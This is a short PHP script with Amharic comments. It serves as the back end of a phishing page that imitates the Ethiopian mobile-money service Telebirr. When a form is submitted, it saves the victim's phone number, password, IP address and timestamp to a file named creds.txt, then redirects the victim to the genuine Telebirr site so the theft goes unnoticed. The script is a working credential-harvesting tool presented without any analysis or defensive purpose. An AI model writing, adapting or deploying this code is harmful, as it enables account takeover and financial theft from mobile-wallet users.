<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // የተጠቃሚውን መረጃ መቀበል
    $phone = htmlspecialchars($_POST['phone']);
    $password = htmlspecialchars($_POST['password']);
    
    // የተጠቃሚውን IP አድራሻ ማግኘት
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // የዛሬን ቀን ማግኘት
    $date = date("Y-m-d H:i:s");
    
    // መረጃውን በፋይል ውስጥ ማስቀመጥ
    $file = fopen("creds.txt", "a");
    fwrite($file, "=== New Login ===\n");
    fwrite($file, "Date: $date\n");
    fwrite($file, "IP: $ip\n");
    fwrite($file, "Phone: $phone\n");
    fwrite($file, "Password: $password\n");
    fwrite($file, "==================\n\n");
    fclose($file);
    
    // ተጠቃሚውን ወደ እውነተኛው የ Telebirr ገጽ መላክ
    header("Location: https://telebirr.et");
    exit();
} else {
    // በቀጥታ ከገጹ ካልመጣ ወደ መግቢያው መመለስ
    header("Location: index.php");
    exit();
}
?
